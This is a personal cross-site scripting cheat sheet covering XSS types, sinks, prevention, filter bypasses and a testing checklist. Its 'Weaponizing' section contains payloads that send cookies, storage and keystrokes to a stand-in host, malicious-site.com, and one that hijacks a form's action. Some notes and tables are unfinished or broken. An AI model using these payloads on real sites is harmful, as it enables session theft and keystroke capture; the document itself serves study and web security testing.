<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

Need to research:
https://github.com/PortSwigger/xss-validator
Uploading .html file
```
%PDF-1.4
%Ã¤Ã¼Ã¶Ã
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
x=Ë
1E÷ù»v¶é´0è~ àø
R
R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
```
- document.cookies for XSS
- non-HTML-based sinks? Like setTimeout. What does that mean?
- Content security policy to prevent XSS?
- Dangling markup injections?
- Why double url encode?

- Todo
	- HTML encoding(Ex: change `<`s to `&lt;`) vs HTML sanitization(Allowing some html elements, but not all)

<!-- TOC -->

- [Cross Site ScriptingXSS](#cross-site-scriptingxss)
	- [URL parameter XSS](#url-parameter-xss)
	- [Common payloads](#common-payloads)
	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
		- [Inside html entities](#inside-html-entities)
		- [Inside html attributes](#inside-html-attributes)
			- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
		- [Inside Javascript](#inside-javascript)
		- [Inside CSS](#inside-css)
	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
		- [Stealing information](#stealing-information)
			- [Key logger](#key-logger)
		- [What information to steal](#what-information-to-steal)
		- [Manipulating actions](#manipulating-actions)
	- [Prevent XSS attacks](#prevent-xss-attacks)
	- [Reference table](#reference-table)
	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
	- [Checklist](#checklist)
	- [Javascript special strings syntax](#javascript-special-strings-syntax)

<!-- /TOC -->

--------------------------------------------------------------------------------
- Define XSS
	- URL parameter based
	- Database based

- URL parameter based XSS

- Common payloads

- Different types Sinks
	- HTML elements
	- HTML attributes
	- Javascript
		- innerHTML
	- CSS

- Easy ways to prevent XSS
	- Don't use URL params
	- Follow the common prevention techniques for the different sinks
	- Content Security Policy(CSPs)
		- Sent by server in the header in every response
		- Allows us to specigy exactly what sources are trusted and disable any inline resources

- Bypassing common XSS filters
	- Trying the same character multiple times(replace vs replaceAll)
	- Avoiding commonly used XSS attacks
		- Try something other than
			- `alert()`
			- `<script>`
			- `javascript:`

- Weaponizing XSS

- HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)

- File upload vulnerabilities
	- SVGs
	- PDFs

- Reference table

--------------------------------------------------------------------------------

# Cross Site Scripting(XSS)
Cross site scripting(XSS) allows an attacker to get a victim to run malicious code on their browser while looking like it came from a legitimate source.

There are 2 type of XSS attacks.
- Through URL parameters
	- When a victim is sent a malicious URL, they may click on it because the base domain comes from a legitimate source.
		- **Reflected XSS**: Server uses the URL parameter to change the DOM.
		- **DOM-Based XSS**: Client uses the URL parameter to change the DOM.
- Through the database
	- **Stored XSS**: When the victim comes across malicious data stored in the database, that malicious data gets ran on their browser.
		- Ex: Posting a comment which other users can see.

## URL parameter XSS
- The URL parameter have to be used somewhere within the DOM.
	- They may not visually show up, but they may still be used. Ex: Hidden inputs

```javascript
The URL
	https://insecure-website.com/?parameter=<script>print()</script>
Possible html output
	<p><script>print()</script></p>
```

- Forms often use URL parameters to pass information
- Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.

## Common payloads
- `<script>print()</script>`
- `<img src onerror=print()>`
- `<a href="javascript:print()">`

[Payload list](https://github.com/payloadbox/xss-payload-list)

- Common payload content
- `print()`
- `alert()`
- `confirm()`
- `prompt()`
- `console.log()`

## Different types of Sinks - Where user input is used

### Inside html entities
- Ex: `<p>{userInput}</p>`

In order to prevent this the server should filter out any `<`s
- Ex: `userInput = userInput.replaceAll("<", "&lt;")`
- This works because no html entity can start without a `<`

### Inside html attributes
- Ex: `<a src="{user input}">Link</a>`
- Ex2: `<input value="{user input}">`

In order to prevent this the server should filter out any `<`s and `"`s as well as have a whitelist of URIs
- Ex: `userInput = userInput.replaceAll("<", "&lt;").replaceAll('"', "&quot;")`
- This works because no html entity can start without a `<`

#### Uniform Resource Identifier(URIs)
- URIs are often used for attributes which can access the internet
	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
- `javascript:print()`
- Doesn't work on modern browsers
	- `data:[<mediatype>][;base64],<data>`
		- `data:image/svg+xml;utf8,<svg content>`
		- `data:text/html;base64,PHNjcmlwdD5wcmludCgpPC9zY3JpcHQ+`
		- `data:text/html,<script>print()</script>`
	- `vbscript:MsgBox('XSS')` or `vbscript:msgbox('XSS')`
	- `livescript:[code]`

In order to prevent URI attacks there should be a whitelist of acceptable URIs and not a blacklist.
- Why not use a Blacklist
	- There are lots of non-standard URIs for different browser
	- There could be more unsafe URIs in the future
	- There can be unique ways of encoding URIs
		- Ex: `jAvAsCrIpT:`, `javas%09cript:`,	`javas]]<![CDATA[cript:`
			- `%09`, `%00`, `%20`, `%10`, `\0`
- Common whitelist used by Wordpress
	- `http`, `https`, `ftp`, `ftps`, `mailto`, `news`, `irc`, `gopher`, `nntp`, `feed`, `telnet`, `mms`, `rtsp`, `svn`, `tel`, `fax`, `xmpp`

Js code for whitelist?
- If it begins with a specific URI?
	- Could you do `https://javascript:alert()`

### Inside Javascript
- Ex:

```javascript
const params = new URLSearchParams(window.location.search)
const param1 = params.get('param1')
const param2 = params.get('param2')
```

- May need escaping
- Common js code to get URL parameters and fragment identifies(`#`)
	- `document.URL`, `document.documentURI`, `document.baseURI`
	- Location(these are all the same obj): `window.location`, `document.location`, `location`
	- JQuery: `.parseParams()`
- Sinks
	- innerHTML

### Inside CSS
	- Not very common

## Weaponizing XSS payloads

### Stealing information
- Redirect site to malicious site: `window.location='https://malicious-site.com?info=' + info`
- Send data to malicious site without redirect: `
- Mouse hover over element: `<a href="https://www.youtube.com/" onmouseover="window.location='https://malicious-site.com?info=' + info">Youtube</a>`
	- This could be blocked by Content Security Policy

#### Key logger
- Can't use `fetch` because it's blocked by CORS

```javascript
document.addEventListener('keydown', (event) => {
    const script = document.createElement('script');
    script.src = 'http://malicious-site.com/?key=' + encodeURIComponent(event.key);
    document.body.appendChild(script);
});
```

### What information to steal
- Cookies: `escape(document.cookie)`
	- `escape` URL encodes the cookie so it can be sent through the URL
- Storage: `escape(JSON.stringify(localStorage))` or `escape(JSON.stringify(sessionStorage))`

### Manipulating actions
- Wait for elements to load: `<script>window.onload=function(){`
	- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
- `}</script>`

## Prevent XSS attacks
- Pass information through the body instead of through URL parameters

- Don't use react's `dangerouslySetInnerHTML`
- Filter input as strictly as possible.
	- Use a whitelist to only allow certain characters or words.
	- Search and replace with HTML
		- `&` to `&amp;`
		- `<` to `&lt;`
		- `>` to `&gt;`
		- `"` to `&quot;`
		- `'` to  `&#x27;`
	- Search and replace with JS
		- `&` to `\u0026`
		- `<` to `\u003c`
		- `>` to `\u003e`
		- `"` to  `\u0022`
		- `'` to  `\u0027`
- Instead of `element.innerHTML = userInput;` use:
	- `element.innerText = userInput;`
	- `let textNode = document.createTextNode(userInput); element.appendChild(textNode);`
	- Note: These DO NOT work if the element is a script element as the text will be executed as JS.

- Use Content-Security Policy(CSPs)
	- Can distinguish between legitimate inputs and injected JS code
	- 

Use `<input value="userInput">`

which is an additional header in the server or specified in the html which only allows certain 
	- This only limits what XSS can do. It might not prevent it.

--------------------------------------------------------------------------------

## Reference table

| Symbol | HTML name | HTML code | HTML hex code |           | URL   | JS Unicode | JS Hex | JS Oct |
|--------|-------------------|-------|------------|--------|--------|
| `"`    | `&quot;` , `&#34` | `%22` |            |        |        |
| `&`    | `&amp;`           | `%26` |            |        |        |

| `%`    | `&
| `'`    |

" , `&lpar;`, `&rpar;`
HTML hex code: `&#x6A`

- Unicode(ASCII hex)
	- `<`: `\u003C`
- Hexadecimal
	- `<`: `\x3c`
- Octal
	- `<`: `\074`

| Filtered symbol | Try instead                                      |
|-----------------|--------------------------------------------------|
| `"`s or `'`s    | `&quot;`, `&lpar;` and `&rpar;`, `%27`, or `%22` |
| `<`s            | `&lt;`, `%3C`, or `\x3c`                         |
| `>`s            | `&gt;`, `%3E`, or `\x3e`                         |
| `\`s            | `\\`                                             |
| `(`s and `)`s   |                                                  |
| `&`s            | `%26` , `&amp;`                                  |
| `%`s            |                                                  |
| `.`s            |                                                  |
| `=`s            |                                                  |

## Bypassing common XSS filters
- Filtering out tags
	- Test all the tag
- Filter out events
	- Test all the events
- Filtering out special characters
	- Test alternatives to special character

See [XXS Tests](./xss_tests.md)

Often times inputs are filtered to remove or replace certain characters. This usually means that that input isn't susceptible to XSS attacks, however the filter might not be set up correctly.


Sometimes you need to add `">` or `'>` in front of your attacks as an escape sequence.

- It is often times worth try to double URL encode you input.

--------------------------------------------------------------------------------

## Checklist
URl Parameter XSS:
1. Put unique string in URL parameter: `NkgM41FlLR`
2. Find a URL parameter that puts its output to the DOM.
	- Do ctrl+f in inspect element DOM to check for hidden DOM elements that contain the parameter.
3. Search in client JS for code which gets the query parameter.
4. Filter in Burp Suit for any responses containing the unique string.
5. Test basic XSS attacks
6. Figure out which characters are being filtered out and test alternative representations of those characters.

Stored XSS:
1. Create 2 accounts and log in. One in private browser.
2. Attacking account posts XSS attack.
3. 2nd account checks the post to see if it runs.

## Javascript special strings syntax
